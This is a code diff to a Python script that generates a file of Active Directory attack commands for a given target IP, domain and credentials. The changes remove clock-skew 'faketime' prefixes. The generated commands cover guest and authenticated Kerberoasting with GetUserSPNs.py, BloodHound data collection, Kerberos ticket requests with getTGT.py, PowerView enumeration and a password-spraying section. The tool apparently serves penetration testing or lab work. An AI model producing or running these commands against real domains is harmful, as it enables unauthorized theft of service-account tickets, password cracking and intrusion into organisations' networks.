@@ -59,7 +59,7 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
         f.write("# Kerberoasting\n")
         if not has_creds:
             f.write("# Kerberoasting as a guest\n")
-            f.write(f"faketime -f +7h GetUserSPNs.py -target-domain {domain} -usersfile users.txt -dc-ip {hostname}.{domain} {domain}/guest -no-pass\n")
+            f.write(f"GetUserSPNs.py -target-domain {domain} -usersfile users.txt -dc-ip {hostname}.{domain} {domain}/guest -no-pass\n")
         if has_creds:
             f.write("# Authenticated Kerberoasting\n")
             f.write(f"GetUserSPNs.py -request -dc-ip {target_ip} {domain}/{user} -save -outputfile GetUserSPNs.out\n")
@@ -78,16 +78,16 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
         # Bloodhound CE Python
         f.write("# Bloodhound CE Python ingestor\n")
         if has_creds:
-            f.write(f"faketime -f +7h bloodhound-ce-python -c ALL -u '{user}' -p '{password}' -d {domain} -dc {hostname}.{domain} -ns {target_ip}\n\n")
+            f.write(f"bloodhound-ce-python -c ALL -u '{user}' -p '{password}' -d {domain} -dc {hostname}.{domain} -ns {target_ip}\n\n")
         else:
-            f.write(f"faketime -f +7h bloodhound-ce-python -c ALL -u 'guest' -p '' -d {domain} -dc {hostname}.{domain} -ns {target_ip}\n\n")
+            f.write(f"bloodhound-ce-python -c ALL -u 'guest' -p '' -d {domain} -dc {hostname}.{domain} -ns {target_ip}\n\n")
 
         # Powerview.py enumeration
         if has_creds:
             f.write("# Powerview.py enumeration\n")
-            f.write(f"faketime -f +7h getTGT.py {domain}/{user}:'{password}'\n")
+            f.write(f"getTGT.py {domain}/{user}:'{password}'\n")
             f.write(f"export KRB5CCNAME=./{user}.ccache\n")
-            f.write(f"faketime -f +7h powerview {domain}/{user}@{target_ip} -k --no-pass --dc-ip {target_ip}\n\n")
+            f.write(f"powerview {domain}/{user}@{target_ip} -k --no-pass --dc-ip {target_ip}\n\n")
 
         # Password spraying
         if has_creds:
